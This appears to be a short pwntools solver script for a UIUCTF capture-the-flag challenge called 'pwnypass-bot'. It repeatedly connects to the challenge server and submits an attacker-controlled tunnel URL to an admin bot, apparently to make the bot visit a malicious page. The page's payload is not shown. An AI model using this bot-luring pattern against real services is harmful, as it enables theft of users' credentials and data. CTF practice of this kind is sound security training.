from pwn import *

ip = 'localhost'
ip = 'pwnypass-bot.chal.uiuc.tf'
port = 1337

attacker_url = b'https://544cf8630a5897.lhr.life'

while True:
    conn = remote(ip, port, ssl=True)
    conn.recv()

    conn.sendline(attacker_url)
    conn.recvuntil(b'timeout')
    print("Attack done!")
    conn.close()